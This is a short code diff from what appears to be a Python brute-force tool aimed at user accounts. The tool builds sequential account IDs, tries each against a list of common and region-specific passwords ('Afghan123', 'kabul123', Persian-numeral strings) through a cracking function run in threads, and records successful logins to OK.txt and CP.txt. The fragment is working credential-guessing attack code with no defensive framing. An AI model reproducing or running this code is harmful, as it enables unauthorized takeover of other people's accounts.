@@ -367,7 +367,7 @@ def m3():
         lines()
         for guru in user:
             uid = kode+guru
-            pwx=[guru,'Afghan123','Afghanistan','۱۲۳۴۵۶','kabul123','۱۰۰۲۰۰','123456','12345678','123456789','1234567890','11223344']
+            pwx=[guru,'Afghan123','Afghanistan','۱۲۳۴۵۶','kabul123']
             yaari.submit(rcrack,uid,pwx,tl)
     print(46*'-')
     print('IDZ SAVED IN OK.txt : CP.txt')
